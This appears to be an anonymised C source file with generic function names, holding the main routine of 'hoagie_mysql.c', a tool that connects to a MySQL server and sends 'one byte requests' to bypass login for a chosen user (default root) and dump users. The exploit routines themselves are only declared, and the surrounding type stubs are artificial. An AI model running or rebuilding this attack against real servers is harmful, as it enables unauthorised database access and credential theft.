#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  MYSQL ;

/* Variables and functions */
 char EOF ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ *,char*,char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *,char*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 char FUNC4 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,char*,char*,char*) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int /*<<< orphan*/  stdin ; 

int FUNC8(int argc, char **argv) {
   MYSQL mysql;
   char optchar;
   char *target, *user, *password, *attackuser, *action;

   target = user = password = action = attackuser= NULL;

   while ( (optchar = FUNC4(argc, argv, "ht:u:p:a:e:")) != EOF ) {
       switch(optchar) { 
           case 'h': FUNC7("hoagie_mysql.c\n");
                     FUNC7("-t ... mysql server (default localhost)\n");
      		     FUNC7("-u ... username (default empty)\n");
                     FUNC7("-p ... password (default empty)\n");
                     FUNC7("-a ... attack user (default root)\n");
                     FUNC7("-e ... action\n");
                     FUNC7("-h ... this screen\n");
                     FUNC2(0);
           case 't': target = optarg;
                     break;
           case 'u': user = optarg;
                     break;
           case 'p': password = optarg;
                     break;
           case 'a': attackuser = optarg;
                     break;
           case 'e': action = optarg;
       }
   }

   if (!target) target = "localhost";
   if (!user) user = "";
   if (!password) password = "";
   if (!attackuser) attackuser = "root";
   if (!action) action = "dumpuser";

   FUNC7("connecting to [%s] as [%s] ... ", target, user);
   FUNC3(stdin);

   if (!FUNC6(&mysql, target, user, password)) {
       FUNC7("failed\n");
       return 0;
   } else {
       FUNC7("ok\n");
   }

   FUNC7("sending one byte requests with user [%s] ... \n", attackuser);
   if (!FUNC1(&mysql, attackuser)) {
       FUNC0(&mysql, action, user);
   } else {
       FUNC7("attack failed\n");
   }
   FUNC5(&mysql);

   return 0;
}